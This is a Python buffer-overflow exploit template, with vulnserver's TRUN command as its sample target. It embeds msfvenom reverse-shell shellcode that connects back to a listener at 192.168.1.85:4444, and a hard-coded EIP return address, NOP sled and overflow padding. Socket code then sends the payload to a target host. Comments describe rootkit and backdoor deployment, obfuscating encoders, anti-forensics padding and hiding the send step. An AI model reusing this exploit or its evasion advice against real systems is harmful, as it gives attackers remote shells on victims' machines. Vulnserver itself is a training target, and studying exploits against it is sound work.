#!/usr/bin/python3

## Tempalte for Buffer Overflows
## Currently using vulnserver exploit as sample.


## ---------- | imports | ---------- ##
import socket


##  --------- | OllyDbg Table | ---------- ##
## -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
#  Executable modules                                                                                                                                                                                                                    #
#  Base                      Size                    Entry                     Name                File version                           Path                                                                                           #
#  [  ]                      [  ]                    [    ]                    [  ]                [         ]                          [ C:\Windows\<.dll/.sys>  OR  C:\Windows\system32\<.dll/.sys>  OR  C:\Users\<USER>\<.dll/.sys> ] #
#  [  ]                      [  ]                    [    ]                    [  ]                [         ]                          [ C:\Windows\<.dll/.sys>  OR  C:\Windows\system32\.sys]                                          #
## -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##



##  --------- | OllyDbg Example Table | ---------- ##
## -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
# Base                         Size                         Entry                         Name                 File version                     Path
# [62500000]                   [00008000 (32768.)]          [625010C0]                    [essfunc]                                             [C:\Users\a\Desktop\Dir\BOF\VulSrv\essfunc.dll]
##
##
##	Base           [62500000]
##	Size           [00008000 (32768.)]
##	Entry          [625010C0]
##	Name           [essfunc]
##      File version 
##      Path           [C:\Users\a\Desktop\Dir\BOF\VulSrv\essfunc.dll]
## -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##


#|----------------------------|
#|---| Rootkit & Backdoors |--|
#|----------------------------| ##-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
# Rootkit deloyer & Backdoor platform (msf (paylaods and encoders, options ...) --rootkit <any of the below>                                                                                            #
# x86/Winrk          Via NT\SysListView32                                Hides files and processes with prefix (by default set to) "_TRYTOSEEME"     Optional: Backdoor @ boot?     (Default: NO)        #
# x64/Linux          via proc                                            Hides net strings with prefix                                                                                                   #
                                                                         ## -(by default set to) "_TRYTOSEEME"                                                                                          #
                                                                         ## -(If used with a reverse shell): Use Covert Channel instead of MSF default?                                                 #
                                                                         ## -(Default: NO)                                                                                                              #
## --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##





# Options:
#    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
#    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
#        --list-options               List --payload <value>'s standard, advanced and evasion options
#    -f, --format          <format>   Output format (use --list formats to list)
#    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
#        --service-name    <value>    The service name to use when generating a service binary
#        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
#        --smallest                   Generate the smallest possible payload using all available encoders
#        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
#        --encrypt-key     <value>    A key to be used for --encrypt
#        --encrypt-iv      <value>    An initialization vector for --encrypt
#    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
#        --platform        <platform> The platform for --payload (use --list platforms to list)
#    -o, --out             <path>     Save the payload to a file
#    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
#    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
#        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
#    -s, --space           <length>   The maximum size of the resulting payload
#        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
#    -i, --iterations      <count>    The number of times to encode the payload
#    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
#    -x, --template        <path>     Specify a custom executable file to use as a template
#    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
#    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
#    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
#    -h, --help                       Show this message




# [!] --> Save to output -> use -e x86/nn_obf -> (and so on)


## -----------------------|
##--|Our Own|--| Encoders |
##-------------| -------- |
## x86/asm_hmac                manual     hmac-based asm matrice encoder
## x86/asm_obf                 manual     obfuscator using the customized py3 script
## x86/nn_obf                             neural network-based obfuscator which, is quite bad
## 					  -But it gets the job done
# --------------------------------------------------------------------------------------------##




## Or, go classic
## [Bash] msfvenom --list e
## Framework Encoders [--encoder <value>]
## .... ##
## ------------------------------------------------------------------------------------------ ##
# x86/add_sub                   manual     Add/Sub Encoder                                     |
# x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder               |
# x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder               |
# x86/avoid_underscore_tolower  manual     Avoid underscore/tolower                            |
# x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower                                  |
# x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder      |
# x86/bmp_polyglot              manual     BMP Polyglot                                        |
# x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder                            |
# x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder           |
# x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder         |
# x86/context_time              manual     time(2)-based Context Keyed Payload Encoder         |
# x86/countdown                 normal     Single-byte XOR Countdown Encoder                   |
# x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder       |
# x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder             |
# x86/nonalpha                  low        Non-Alpha Encoder                                   |
# x86/nonupper                  low        Non-Upper Encoder                                   |
# x86/opt_sub                   manual     Sub Encoder (optimised)                             |
# x86/service                   manual     Register Service                                    |
# x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder           |
# x86/single_static_bit         manual     Single Static Bit                                   |
# x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder       |
# x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder       |
# x86/xor_dynamic               normal     Dynamic key XOR Encoder                             |
## ------------------------------------------------------------------------------------------ ##



## nasm > 
## ------------------------------------ ##
# JMP ESP                                |
# 00000000  FFE4              jmp esp    |
#                                        |
# CALL ESP                               |
# 00000000  FFD4              call esp   |
#                                        | 
# NOP & nop                              |
# 00000000  90                nop        |
## ------------------------------------ ##



# Do provide info like this:

## msfvenom -a x86 -platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.85 LPORT=4444 -e x86/jmp_call_additive -b '\x00' -f python
## [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
## Found 1 compatible encoders
## 
## Attempting to encode payload with 1 iterations of x86/jmp_call_additive
## 
## x86/jmp_call_additive succeeded with size 353 (iteration=0)
## x86/jmp_call_additive chosen with final size 353
## 
## Payload size: 353 bytes
## Final size of python file: 1731 bytes

# [Bash] msfvenom -a x86 -platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.85 LPORT=4444 -e x86/jmp_call_additive -b '\x00' -f python -
sh2=b"\xfc\xbb\xa1\x5d\x10\xc6\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\xb5\x92\xc6\x9d\x46\xf3\x4f\x78\x77\x33\x2b\x09\x28\x83\x3f\x5f\xc5\x68\x6d\x4b\x5e\x1c\xba\x7c\xd7\xab\x9c\xb3\xe8\x80\xdd\xd2\x6a\xdb\x31\x34\x52\x14\x44\x35\x93\x49\xa5\x67\x4c\x05\x18\x97\xf9\x53\xa1\x1c\xb1\x72\xa1\xc1\x02\x74\x80\x54\x18\x2f\x02\x57\xcd\x5b\x0b\x4f\x12\x61\xc5\xe4\xe0\x1d\xd4\x2c\x39\xdd\x7b\x11\xf5\x2c\x85\x56\x32\xcf\xf0\xae\x40\x72\x03\x75\x3a\xa8\x86\x6d\x9c\x3b\x30\x49\x1c\xef\xa7\x1a\x12\x44\xa3\x44\x37\x5b\x60\xff\x43\xd0\x87\x2f\xc2\xa2\xa3\xeb\x8e\x71\xcd\xaa\x6a\xd7\xf2\xac\xd4\x88\x56\xa7\xf9\xdd\xea\xea\x95\x12\xc7\x14\x66\x3d\x50\x67\x54\xe2\xca\xef\xd4\x6b\xd5\xe8\x1b\x46\xa1\x66\xe2\x69\xd2\xaf\x21\x3d\x82\xc7\x80\x3e\x49\x17\x2c\xeb\xde\x47\x82\x44\x9f\x37\x62\x35\x77\x5d\x6d\x6a\x67\x5e\xa7\x03\x02\xa5\x20\xec\x7b\xa4\xe5\x84\x79\xa6\x14\x09\xf7\x40\x7c\xa1\x51\xdb\xe9\x58\xf8\x97\x88\xa5\xd6\xd2\x8b\x2e\xd5\x23\x45\xc7\x90\x37\x32\x27\xef\x65\x95\x38\xc5\x01\x79\xaa\x82\xd1\xf4\xd7\x1c\x86\x51\x29\x55\x42\x4c\x10\xcf\x70\x8d\xc4\x28\x30\x4a\x35\xb6\xb9\x1f\x01\x9c\xa9\xd9\x8a\x98\x9d\xb5\xdc\x76\x4b\x70\xb7\x38\x25\x2a\x64\x93\xa1\xab\x46\x24\xb7\xb3\x82\xd2\x57\x05\x7b\xa3\x68\xaa\xeb\x23\x11\xd6\x8b\xcc\xc8\x52\xbb\x86\x50\xf2\x54\x4f\x01\x46\x39\x70\xfc\x85\x44\xf3\xf4\x75\xb3\xeb\x7d\x73\xff\xab\x6e\x09\x90\x59\x90\xbe\x91\x4b\x90\x40\x6e\x74"


# [Bash] msfvenom -a x86 –platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.85 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -f python
sh1=b"\xba\xbd\xe2\xa0\xc1\xd9\xeb\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x53\x1e\x42\x34\x57\x37\x01\xb7\xa7\xc8\x66\x31\x42\xf9\xa6\x25\x07\xaa\x16\x2d\x45\x47\xdc\x63\x7d\xdc\x90\xab\x72\x55\x1e\x8a\xbd\x66\x33\xee\xdc\xe4\x4e\x23\x3e\xd4\x80\x36\x3f\x11\xfc\xbb\x6d\xca\x8a\x6e\x81\x7f\xc6\xb2\x2a\x33\xc6\xb2\xcf\x84\xe9\x93\x5e\x9e\xb3\x33\x61\x73\xc8\x7d\x79\x90\xf5\x34\xf2\x62\x81\xc6\xd2\xba\x6a\x64\x1b\x73\x99\x74\x5c\xb4\x42\x03\x94\xc6\xff\x14\x63\xb4\xdb\x91\x77\x1e\xaf\x02\x53\x9e\x7c\xd4\x10\xac\xc9\x92\x7e\xb1\xcc\x77\xf5\xcd\x45\x76\xd9\x47\x1d\x5d\xfd\x0c\xc5\xfc\xa4\xe8\xa8\x01\xb6\x52\x14\xa4\xbd\x7f\x41\xd5\x9c\x17\xa6\xd4\x1e\xe8\xa0\x6f\x6d\xda\x6f\xc4\xf9\x56\xe7\xc2\xfe\x99\xd2\xb3\x90\x67\xdd\xc3\xb9\xa3\x89\x93\xd1\x02\xb2\x7f\x21\xaa\x67\x2f\x71\x04\xd8\x90\x21\xe4\x88\x78\x2b\xeb\xf7\x99\x54\x21\x90\x30\xaf\xa2\x5f\x6c\xae\x67\x08\x6f\xb0\x96\x94\xe6\x56\xf2\x34\xaf\xc1\x6b\xac\xea\x99\x0a\x31\x21\xe4\x0d\xb9\xc6\x19\xc3\x4a\xa2\x09\xb4\xba\xf9\x73\x13\xc4\xd7\x1b\xff\x57\xbc\xdb\x76\x44\x6b\x8c\xdf\xba\x62\x58\xf2\xe5\xdc\x7e\x0f\x73\x26\x3a\xd4\x40\xa9\xc3\x99\xfd\x8d\xd3\x67\xfd\x89\x87\x37\xa8\x47\x71\xfe\x02\x26\x2b\xa8\xf9\xe0\xbb\x2d\x32\x33\xbd\x31\x1f\xc5\x21\x83\xf6\x90\x5e\x2c\x9f\x14\x27\x50\x3f\xda\xf2\xd0\x4f\x91\x5e\x70\xd8\x7c\x0b\xc0\x85\x7e\xe6\x07\xb0\xfc\x02\xf8\x47\x1c\x67\xfd\x0c\x9a\x94\x8f\x1d\x4f\x9a\x3c\x1d\x5a"


## --------------------------------- ##
#BLANK[ ] VULNERABLE FIELD HERE
# e.g vulnserver
vf=b"TRUN /.:/"
## --------------------------------- ##


## --------------------------------- ##
#BLANK []  NUMBER OF NOPS HERE
nop=b"\x90"; num_of_nops=10
nops=nop*num_of_nops
## --------------------------------- ##


## --------------------------------- ##
# BLANK[] EIP HERE
EIP=b"\xaf\x11\x50\x62"
## --------------------------------- ##


## --------------------------------- ##
# BLANK[] AS HERE
## (the amount that cause DOS but NOT EIP overwrite)
As = 2003

## ------------------------------------ ##


## ------------------------------------ ##
# BLANK[] FULL_EIP_OVERWRITE HERE 
## (the amount of A's that cause a DOS AS WELL AS A TOTAL EIP OVERWRITE)
FULL_EIP_OVERWRITE=2007


## ------------------------------------ ##
EIP_LOCATION = FULL_EIP_OVERWRITE - len(EIP)
## ------------------------------------ ##


# BLANK[] x_As HERE
## obfuscate A's for anti-memory-forensics

# x_As=b"\41"*EIP_LOCATION

# ---------  USE x86/asm_obf IF USED! --------- #
x_As=b"\31"*EIP_LOCATION
# ---------  USE x86/asm_obf IF USED! --------- #


load = [ vf,    ## ------| vf         - vulnerable field
         x_As,  ## ------| x_As       - b"\41" * EIP_LOCATION
         EIP,   ## ------| EIP        - b"\xaf\x11\x50\x62"
         nops,  ## ------| NOP_RAMP   - nop*num_of_nops
         sh2    ## ------| sh         - shellcode 
         ##                             ## ( sh1=shikata ga nai,
         ##                             ##   sh2=jmp,call,[+])
        ]
## ---------------------------------------- ##


# (hopefully) nothing to change here
## ------------------|  |------------------ ##
pkt = (load[0]+load[1]+load[2]+load[3]+load[4])

# Dbg print(pkt,len(pkt))
## for Dbg purposes

## ------------------|  |------------------ ##
s = socket.socket(socket.AF_INET,            #
                  socket.SOCK_STREAM)        #
## ---------------------------------------- ##

## BLANK[] HERE
## ------------------|  |------------------ ##
dstIP = "192.168.122.214"                    #
dstPRT=  9999                                #
                                             #
DST = [str(dstIP),                           #
       int(dstPRT)]                          #
## ---------------------------------------- ##

## ------------------|  |------------------ ##
s.connect((DST[0],                           #
           DST[1])); s.send(pkt)             ## don't forget to obfuscate this bit (Especially if you are using windows with rootkit)
s.close()                                    #
## ---------------------------------------- ##

